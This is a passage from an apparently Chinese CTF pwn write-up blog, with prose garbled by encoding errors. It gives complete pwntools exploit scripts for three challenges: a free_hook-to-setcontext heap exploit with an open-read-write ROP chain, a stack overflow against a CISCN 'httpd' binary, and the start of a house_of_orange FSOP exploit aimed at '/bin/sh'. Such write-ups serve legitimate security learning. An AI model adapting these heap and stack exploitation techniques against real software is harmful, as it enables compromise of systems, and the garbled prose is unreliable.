<h5 id="Step3-æ„é€ ropé“¾"><a href="#Step3-æ„é€ ropé“¾" class="headerlink" title="Step3 æ„é€ ropé“¾"></a>Step3 æ„é€ ropé“¾</h5><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># open</span></span><br><span class="line">rop = p64(pop_rdi_ret)+p64(flag_addr)</span><br><span class="line">rop += p64(pop_rsi_ret)+p64(<span class="number">0</span>)</span><br><span class="line">rop += p64(pop_rax_ret)+p64(<span class="number">2</span>)         </span><br><span class="line">rop += p64(syscall) </span><br><span class="line"><span class="comment"># read</span></span><br><span class="line">rop += p64(pop_rdi_ret)+p64(<span class="number">3</span>)</span><br><span class="line">rop += p64(pop_rsi_ret)+p64(flag_addr)</span><br><span class="line">rop += p64(pop_rdx_ret)+p64(<span class="number">0x30</span>)</span><br><span class="line">rop += p64(pop_rax_ret)+p64(<span class="number">0</span>)</span><br><span class="line">rop += p64(syscall)</span><br><span class="line"><span class="comment"># write</span></span><br><span class="line">rop += p64(pop_rdi_ret)+p64(<span class="number">1</span>)</span><br><span class="line">rop += p64(pop_rsi_ret)+p64(flag_addr)</span><br><span class="line">rop += p64(pop_rdx_ret)+p64(<span class="number">0x30</span>)</span><br><span class="line">rop += p64(pop_rax_ret)+p64(<span class="number">1</span>)</span><br><span class="line">rop += p64(syscall)</span><br></pre></td></tr></table></figure>
<h5 id="Step4-åŠ«æŒfree-hook-getshell"><a href="#Step4-åŠ«æŒfree-hook-getshell" class="headerlink" title="Step4 åŠ«æŒfree_hook getshell"></a>Step4 åŠ«æŒfree_hook getshell</h5><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x18</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(setcontext))  <span class="comment">## free_hook chang to setcontext+53</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x28</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;./flag\x00\x00&#x27;</span>)  <span class="comment">## ./flag in heap + 0x2000  -- rdi</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x38</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(heap_base + <span class="number">0x1000</span>) + p64(ret))  <span class="comment">## mov rsp , [rdi+0a0h]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## rop in heap+0x10000</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x58</span>)</span><br><span class="line">edit(<span class="number">0</span>,rop[:<span class="number">0x58</span>])</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x78</span>)</span><br><span class="line">edit(<span class="number">0</span>,rop[<span class="number">0x58</span>:])</span><br><span class="line"></span><br><span class="line"><span class="comment">## setcontext(rop)</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x48</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<h4 id="å®Œæ•´exp-4"><a href="#å®Œæ•´exp-4" class="headerlink" title="å®Œæ•´exp"></a>å®Œæ•´exp</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;silverwolf&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;1.14.71.254&quot;,28134)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;libc-2.27.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span>(<span class="params">choice</span>):</span></span><br><span class="line">  p.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(choice))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,size</span>):</span></span><br><span class="line">  choice(<span class="number">1</span>)</span><br><span class="line">  p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">  p.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">  choice(<span class="number">2</span>)</span><br><span class="line">  p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">  p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">  p.sendline(content)</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">  choice(<span class="number">3</span>)</span><br><span class="line">  p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">  choice(<span class="number">4</span>)</span><br><span class="line">  p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">clean</span>():</span></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x78</span>)</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x18</span>)</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">14</span>):</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x68</span>)</span><br><span class="line">  add(<span class="number">0</span>,<span class="number">0x58</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">clean()</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;  </span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x28</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x28</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">heap_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>)) &amp; <span class="number">0xFFFFFFFFFFFFF000</span>-<span class="number">0x1000</span></span><br><span class="line">success(<span class="string">&quot;heap:&quot;</span> + <span class="built_in">hex</span>(heap_base))</span><br><span class="line">edit(<span class="number">0</span>,p64(heap_base+<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x28</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x28</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x7000000</span>))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x3ebca0</span></span><br><span class="line">success(<span class="string">&quot;libc:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">setcontext = libc_base + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">53</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x48</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">9</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x18</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(heap_base+<span class="number">0x50</span>))</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x38</span>)</span><br><span class="line">payload = p64(free_hook) <span class="comment">#18</span></span><br><span class="line">payload += p64(heap_base + <span class="number">0x2000</span>) <span class="comment">#28   </span></span><br><span class="line">payload += p64(heap_base + <span class="number">0x20a0</span>) <span class="comment">#38      </span></span><br><span class="line">payload += p64(heap_base + <span class="number">0x2000</span>) <span class="comment">#48</span></span><br><span class="line">payload += p64(heap_base + <span class="number">0x1000</span>) <span class="comment">#58</span></span><br><span class="line">payload += p64(<span class="number">0</span>) <span class="comment">#68</span></span><br><span class="line">payload += p64(heap_base + <span class="number">0x1000</span>+<span class="number">0x58</span>)<span class="comment">#78</span></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"><span class="comment">#add(0,0x78)</span></span><br><span class="line"><span class="comment">#edit(0,p64(0)*12)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#add(0,0x18)</span></span><br><span class="line">pop_rax_ret = libc_base+<span class="number">0x0000000000043ae8</span></span><br><span class="line">pop_rdi_ret = libc_base+<span class="number">0x00000000000215bf</span></span><br><span class="line">pop_rsi_ret = libc_base+<span class="number">0x0000000000023eea</span></span><br><span class="line">pop_rdx_ret = libc_base+<span class="number">0x0000000000001b96</span></span><br><span class="line">ret = libc_base+<span class="number">0x0000000000023eeb</span></span><br><span class="line">open1 = libc_base + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read = libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write = libc_base + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">alarm = libc_base + libc.sym[<span class="string">&#x27;alarm&#x27;</span>]</span><br><span class="line">syscall = alarm+<span class="number">0x5</span></span><br><span class="line">flag_addr = heap_base+<span class="number">0x2000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># rop chain</span></span><br><span class="line">rop = p64(pop_rdi_ret)+p64(flag_addr)</span><br><span class="line">rop += p64(pop_rsi_ret)+p64(<span class="number">0</span>)</span><br><span class="line">rop += p64(pop_rax_ret)+p64(<span class="number">2</span>)</span><br><span class="line">rop += p64(syscall)</span><br><span class="line">rop += p64(pop_rdi_ret)+p64(<span class="number">3</span>)</span><br><span class="line">rop += p64(pop_rsi_ret)+p64(flag_addr)</span><br><span class="line">rop += p64(pop_rdx_ret)+p64(<span class="number">0x30</span>)</span><br><span class="line">rop += p64(pop_rax_ret)+p64(<span class="number">0</span>)</span><br><span class="line">rop += p64(syscall)</span><br><span class="line">rop += p64(pop_rdi_ret)+p64(<span class="number">1</span>)</span><br><span class="line">rop += p64(pop_rsi_ret)+p64(flag_addr)</span><br><span class="line">rop += p64(pop_rdx_ret)+p64(<span class="number">0x30</span>)</span><br><span class="line">rop += p64(pop_rax_ret)+p64(<span class="number">1</span>)</span><br><span class="line">rop += p64(syscall)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x18</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(setcontext))  <span class="comment">## free_hook chang to setcontext+53</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x28</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;./flag\x00\x00&#x27;</span>)  <span class="comment">## ./flag in heap + 0x2000  -- rdi</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x38</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(heap_base + <span class="number">0x1000</span>) + p64(ret))  <span class="comment">## mov rsp , [rdi+0a0h]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## rop in heap+0x10000</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x58</span>)</span><br><span class="line">edit(<span class="number">0</span>,rop[:<span class="number">0x58</span>])</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x78</span>)</span><br><span class="line">edit(<span class="number">0</span>,rop[<span class="number">0x58</span>:])</span><br><span class="line"></span><br><span class="line"><span class="comment">## setcontext(rop)</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x48</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="2021-11-26"><a href="#2021-11-26" class="headerlink" title="2021-11-26"></a>2021-11-26</h2><h3 id="CISCN-Final-2021-Day2-Message-Board"><a href="#CISCN-Final-2021-Day2-Message-Board" class="headerlink" title="[CISCN Final 2021 Day2]Message_Board"></a>[CISCN Final 2021 Day2]Message_Board</h3><p><a href="https://gitee.com/Nss-harukii/images/raw/master/httpd">é™„ä»¶</a></p>
<p>è¿™åˆ°é¢˜åº”è¯¥æ˜¯Day2æœ€ç®€å•çš„ä¸€é“é¢˜ï¼Œé¢˜ç›®ç±»å‹ä¹Ÿæ˜¯æœ€è¿‘æ¯”è¾ƒå¸¸è§çš„webpwnï¼Œæ¯”è¾ƒè€ƒç ”é€‰æ‰‹å¯¹æ ˆæº¢å‡ºå’Œå¯¹å‡½æ•°è°ƒç”¨æ ˆçš„è¿‡ç¨‹çš„ç†è§£ä»¥åŠå‘ç°åŠåˆ©ç”¨æ¼æ´çš„èƒ½åŠ›</p>
<h4 id="é¢˜ç›®åˆ†æ-5"><a href="#é¢˜ç›®åˆ†æ-5" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h4><p>ä¸åŒäºå¤§å¤šæ•°è¿™ç§httpdçš„webpwn(å¦‚ï¼šæ¹–æ¹˜æ¯çš„tiny_httpd,CISCN çš„HMOS),é€šè¿‡ç›®å½•ç©¿è¶Šæ¥é€ æˆæ¼æ´,è¿™é“é¢˜å°†ç›®å½•ç©¿è¶Šé™åˆ¶çš„å¾ˆæ­»</p>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/33.png" alt="pic"></p>
<p>é¢˜ç›®çš„æ¼æ´ç‚¹åœ¨è¿™é‡Œ</p>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/32.png" alt="pic"></p>
<p>å¦‚æœmessageçš„æœ€åä¸€ä½ä¸æ˜¯<code>|</code>çš„è¯ï¼Œé‚£ä¹ˆå°±ä¼šâ€”n , è€Œnåˆæ˜¯ç­‰äºcontent_lençš„,content_lenåˆæ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è®©content_lenç­‰äº0ï¼Œç„¶åâ€”nå°±ä¼šç­‰äº0xffffffï¼Œä»è€Œå¯¼è‡´åœ¨freadçš„æ—¶å€™æ ˆæº¢å‡ºï¼Œè€Œä¸”åˆšå¥½ä¹Ÿèƒ½é€šè¿‡content_lençš„å¤§å°çš„æ£€æŸ¥ã€‚</p>
<p>é‚£ä¹ˆæˆ‘ä»¬å¦‚ä½•é€šè¿‡è¿™ä¸ªæº¢å‡ºæ¥getshellæˆ–æ˜¯è·å–flagå‘¢ï¼Ÿ</p>
<p>é¦–å…ˆå¦‚æœæˆ‘ä»¬æƒ³è¦getshellå°±éœ€è¦æ³„éœ²å‡ºåœ°å€ï¼Œè€Œåœ¨æœ¬ç¨‹åºä¸­æ‰€æœ‰è¯»å†™å‡½æ•°(å¦‚ï¼š<code>fputs</code>)éƒ½æ˜¯é€šè¿‡æ–‡ä»¶æµå»è¯»å†™ï¼Œè¿™æ ·ä½¿å¾—æˆ‘ä»¬éš¾ä»¥æ³„éœ²å‡ºåœ°å€ï¼Œä½¿å¾—getshellå˜å¾—ååˆ†å›°éš¾</p>
<p>é‚£ä¹ˆæˆ‘ä»¬å°†æ€è·¯è½¬å‘è¯»å–flag,å‘ç°ç¨‹åºä¸­æœ‰ä¸€ä¸ªå¯ä»¥è¯»å–æ–‡ä»¶çš„å‡½æ•°</p>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/34.png" alt="pic"></p>
<p>è€Œä¸”åœ¨ç¨‹åºæµç¨‹ä¸­ä¹Ÿæœ‰è°ƒç”¨ï¼Œä¸”å‚æ•°æˆ‘ä»¬å¯æ§</p>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/35.png" alt="pic"></p>
<p>é‚£ä¹ˆæˆ‘ä»¬å°†ç¨‹åºåŠ«æŒåˆ°è¿™é‡Œï¼Œç„¶åè®¾ç½®[ebp+filename]çš„å€¼ä¸ºæˆ‘ä»¬çš„æ–‡ä»¶åé‚£æˆ‘ä»¬å°±å¯ä»¥å®ç°ä»»æ„æ–‡ä»¶è¯»å–äº†</p>
<p>æˆ‘ä»¬é€šè¿‡åˆ†æå¯ä»¥å‘ç°ä»–ä¼šå°†æˆ‘ä»¬è¾“å…¥çš„headerå­˜åœ¨bssæ®µä¸Šçš„destæ•°ç»„ä¸­ï¼Œé‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦å°†ç®­å¤´æŒ‡å‘çš„åœ°æ–¹æ”¹ä¸ºflagå°±å¯ä»¥å»å¾—åˆ°flagå­—ç¬¦äº†</p>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/36.png" alt="pic"></p>
<p>æœ€åï¼Œç”±äºè¿™ä¸ªé¢˜ç›®ç”¨çš„æ˜¯fread,ç”±äºæˆ‘ä»¬è¿™é‡Œçš„nè¿‡å¤§ï¼Œä»–ä¼šä¸€ç›´ä¸åœçš„è¯»stdinï¼Œæœ‰æ²¡æœ‰åŠæ³•è®©ä»–åœæ­¢å‘¢ã€‚</p>
<p>è¿™å°±æ˜¯æˆ‘é€šè¿‡è¿™ä¸ªé¢˜æ–°å­¦åˆ°çš„ä¸€ä¸ªç‚¹ï¼ˆå‚è€ƒè‡ª<a href="https://www.anquanke.com/post/id/248542">wjhå¸ˆå‚…çš„åšå®¢</a>ï¼‰:</p>
<pre><code>1.è¯»å…¥éå¸¸é•¿çš„å†…å®¹ï¼Œç›´åˆ° fgetc ä¼ å…¥çš„æŒ‡é’ˆæ˜¯é”™è¯¯çš„ï¼ˆè¶…å‡ºæ ˆç©ºé—´ï¼Œå‘ç”Ÿå¼‚å¸¸ï¼‰ï¼Œè¿™æ—¶å€™ fread å‡½æ•°å°±ä¼šç›´æ¥è¿”å›ã€‚
2.ä½¿ç”¨ sh.shutdown_raw(â€˜sendâ€™)æ¥å…³é—­è¾“å…¥ç®¡é“ï¼Œfread å‡½æ•°å°±ä¼šè¿”å›ï¼Œè¿™ä¸ªæ“ä½œå¯è§ VNCTF2021-WriteGiveFlag è¿™é¢˜çš„åšæ³•ã€‚
</code></pre><h4 id="è§£é¢˜æ­¥éª¤-4"><a href="#è§£é¢˜æ­¥éª¤-4" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h4><p>æœ¬é¢˜çš„expæ¯”è¾ƒç®€å•ï¼Œè¿™é‡Œå°±è¯´ä¸€ä¸‹æˆ‘è§£é¢˜çš„æ—¶å€™é‡åˆ°çš„ä¸€äº›é—®é¢˜å§ï¼ˆä¸»è¦æ˜¯æˆ‘è‡ªå·±è ¢äº†ï¼‰</p>
<p>å½“æˆ‘æŠŠç¨‹åºåŠ«æŒåˆ°<code>read_flag</code>æ—¶å³0x80492BDçš„ä½ç½®æ—¶ï¼Œæ­¤æ—¶payload å¦‚ä¸‹ï¼Œå‘ç°æ— æ³•getshell<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*padding + p64(flag_addr) + p64(read_flag)</span><br></pre></td></tr></table></figure></p>
<p>ç„¶ååŠ¨æ€è°ƒè¯•å‘ç°</p>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/37.png" alt="pic"></p>
<p>è¿™é‡Œå°†ebpå‡äº†0x42cï¼Œæ‰€ä»¥è¦å°†flag_addr + 0x42cæ‰èƒ½è¯»åˆ°flag</p>
<h4 id="å®Œæ•´exp-5"><a href="#å®Œæ•´exp-5" class="headerlink" title="å®Œæ•´exp"></a>å®Œæ•´exp</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">&#x27;./httpd&#x27;</span>)</span><br><span class="line">sh = process(<span class="string">&#x27;./httpd&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">read_file = <span class="number">0x80492BD</span> </span><br><span class="line">flag_addr = <span class="number">0x0804C180</span> + <span class="number">0x21</span></span><br><span class="line">payload = <span class="string">b&#x27;POST /submit HTTP/1.1\r\n&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;Content-Length: 0\r\n&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;Cookie: Username=haruki;Messages=flag\r\n&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;\r\n&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x829</span>                 <span class="comment">##è¿™é‡Œçš„paddingæ˜¯messageåˆ°æ ˆåº•çš„è·ç¦»</span></span><br><span class="line">payload += p32(flag_addr +<span class="number">0x42c</span>) </span><br><span class="line">payload += p32(read_file)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.shutdown_raw(<span class="string">&#x27;send&#x27;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="2021-11-27"><a href="#2021-11-27" class="headerlink" title="2021-11-27"></a>2021-11-27</h2><p>ä»Šæ—¥ç”±äºå‚åŠ å‡ åœºçº¿ä¸Šèµ›ï¼ˆåç‰¢ï¼‰ä»¥åŠä¸€äº›ç‰¹æ®Šæƒ…å†µæš‚åœæ›´æ–°ã€‚</p>
<h2 id="2021-11-28"><a href="#2021-11-28" class="headerlink" title="2021-11-28"></a>2021-11-28</h2><h3 id="å®‰æ´µæ¯-2021-ezheap"><a href="#å®‰æ´µæ¯-2021-ezheap" class="headerlink" title="[å®‰æ´µæ¯ 2021]ezheap"></a>[å®‰æ´µæ¯ 2021]ezheap</h3><p><a href="https://gitee.com/Nss-harukii/images/raw/master/ezheap.zip">é™„ä»¶</a></p>
<p>æ˜¨å¤©æ‰“äº†ä¸‰åœºæ¯”èµ›ï¼Œè¿˜æ˜¯æ„Ÿè§‰åˆ°äº†ä¸€äº›å¤§æ¯”èµ›å’Œå°æ¯èµ›çš„å·®è·ï¼Œæ˜¨å¤©axbæ‹¿äº†ä¸€ä¸ªäºŒè¡€ä¸€ä¸ªä¸‰è¡€ï¼Œæ˜¥ç§‹æ¯å’ŒNCTFç›´æ¥åç‰¢ï¼Œçœ‹æ¥è‡ªå·±è¿˜æ˜¯ç»ä¸ä½è€ƒéªŒï¼Œåˆšå¥½è¿™é“é¢˜æ˜¨å¤©å­¦å¼Ÿåœ¨é—®ï¼Œå°±å†™ä¸ªwpå§ã€‚</p>
<h4 id="é¢˜ç›®åˆ†æ-6"><a href="#é¢˜ç›®åˆ†æ-6" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h4><p>è¿™é“é¢˜æ˜¯ç›®å‰æ¯”å°‘è§çš„2.23çš„å †äº†ï¼Œå±äºæ˜¯ä¸€ä¸ªç®€å•é¢˜äº†</p>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/45.png" alt="pic"></p>
<p>ç¨‹åºä¸€å¼€å§‹ä¼šç›´æ¥é€æˆ‘ä»¬ä¸€ä¸ªå †åœ°å€</p>
<p>æ¼æ´ç‚¹åœ¨editå‡½æ•°è¿™é‡Œï¼Œè¿™é‡Œä¼šé‡æ–°è¾“å…¥ä¸€æ¬¡sizeï¼Œå¯ä»¥é€ æˆå †æº¢å‡º</p>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/46.png" alt="pic"></p>
<p>åŒæ—¶é¢˜ç›®ä¸­æ²¡æœ‰freeå‡½æ•°ï¼Œåˆå‘Šè¯‰äº†æˆ‘ä»¬å †åœ°å€åŒæ—¶åˆæœ‰ä¸ªå †æº¢å‡ºï¼Œé‚£ä¹ˆåˆ©ç”¨æ€è·¯å°±æ¯”è¾ƒæ˜æ˜¾äº†ï¼Œç›´æ¥house_of_orangeæ‰“IOç»“æ„ä½“ã€‚å…³äºhouse_of_orangeçš„åŸç†åŠåˆ©ç”¨ï¼Œæˆ‘åœ¨è¿™ç¯‡<a href="https://hgg-bat.github.io/2021/10/04/house-of-orange/#more">ç¬”è®°</a>ä¸­ä¹Ÿå†™å¾—æ¯”è¾ƒè¯¦ç»†ã€‚</p>
<h4 id="è§£é¢˜è¿‡ç¨‹"><a href="#è§£é¢˜è¿‡ç¨‹" class="headerlink" title="è§£é¢˜è¿‡ç¨‹"></a>è§£é¢˜è¿‡ç¨‹</h4><h5 id="Step1-get-gift"><a href="#Step1-get-gift" class="headerlink" title="Step1 get gift"></a>Step1 get gift</h5><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">heap_base = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x10</span></span><br><span class="line">success(<span class="string">&quot;heap: &quot;</span>+ <span class="built_in">hex</span>(heap_base))</span><br></pre></td></tr></table></figure>
<h5 id="Step2-åˆ©ç”¨å †æº¢å‡ºä¿®æ”¹top-chunkçš„å¤§å°ï¼Œå°†top-chunk-free-è¿›å…¥unsorted-binæ¥leak-libc"><a href="#Step2-åˆ©ç”¨å †æº¢å‡ºä¿®æ”¹top-chunkçš„å¤§å°ï¼Œå°†top-chunk-free-è¿›å…¥unsorted-binæ¥leak-libc" class="headerlink" title="Step2 åˆ©ç”¨å †æº¢å‡ºä¿®æ”¹top chunkçš„å¤§å°ï¼Œå°†top chunk free è¿›å…¥unsorted binæ¥leak libc"></a>Step2 åˆ©ç”¨å †æº¢å‡ºä¿®æ”¹top chunkçš„å¤§å°ï¼Œå°†top chunk free è¿›å…¥unsorted binæ¥leak libc</h5><p>æ³¨æ„è¿™é‡Œä¿®æ”¹top chunkçš„æ—¶å€™è¦æ³¨æ„é¡µå¯¹é½,æ¯”å¦‚è¯´è¿™é‡Œçš„top chunkçš„å¤§å°ä¸º0x20f91,linuxåˆ†é¡µæ˜¯ä»¥0x1000ä¸ºä¸€é¡µï¼Œé‚£ä¹ˆæˆ‘ä¼ªé€ çš„æ—¶å€™å°±è¦ä¼ªé€ top chunkçš„sizeä¸º0xf91</p>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/47.png" alt="pic"></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xf91</span>)</span><br><span class="line">edit(<span class="built_in">len</span>(payload),payload)</span><br><span class="line">add(<span class="number">0x1000</span>,<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">b&#x27;c&#x27;</span>)</span><br><span class="line">show()</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x3b7a63</span></span><br><span class="line">success(<span class="string">&quot;libc: &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">IO_list_all = libc_base + libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br></pre></td></tr></table></figure>
<h5 id="Step3-FSOP"><a href="#Step3-FSOP" class="headerlink" title="Step3 FSOP"></a>Step3 FSOP</h5><p>è¿™é‡Œå…·ä½“æ€ä¹ˆä¼ªé€ IO_FILEä»¥åŠä¸ºä»€ä¹ˆï¼Œæˆ‘åœ¨è¿™ç¯‡<a href="https://hgg-bat.github.io/2021/10/04/house-of-orange/#more">ç¬”è®°</a>ä¸­ä¹Ÿå†™çš„æ¯”è¾ƒè¯¦ç»†äº†</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x400</span>                          <span class="comment"># padding</span></span><br><span class="line">payload1 = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+ p64(<span class="number">0x60</span>)          <span class="comment"># _IO_OVERFLOW arg  + unsorted bin size</span></span><br><span class="line">payload1 += p64(<span class="number">0</span>)+p64(IO_list_all-<span class="number">0x10</span>)      <span class="comment"># åŠ«æŒ_IO_list_all</span></span><br><span class="line">payload1 += p64(<span class="number">0</span>)+p64(<span class="number">1</span>)                     <span class="comment"># _IO_write_base &lt; _IO_write_ptr</span></span><br><span class="line">payload1 = payload1.ljust(<span class="number">0xc0</span>,<span class="string">b&#x27;\x00&#x27;</span>)       <span class="comment"># small bin[4] ending</span></span><br><span class="line">payload1 += p64(<span class="number">0</span>)*<span class="number">3</span> + p64(heap_base + <span class="number">0x548</span>) <span class="comment"># heap_base + 0x548 ç›¸å½“äºæ˜¯ 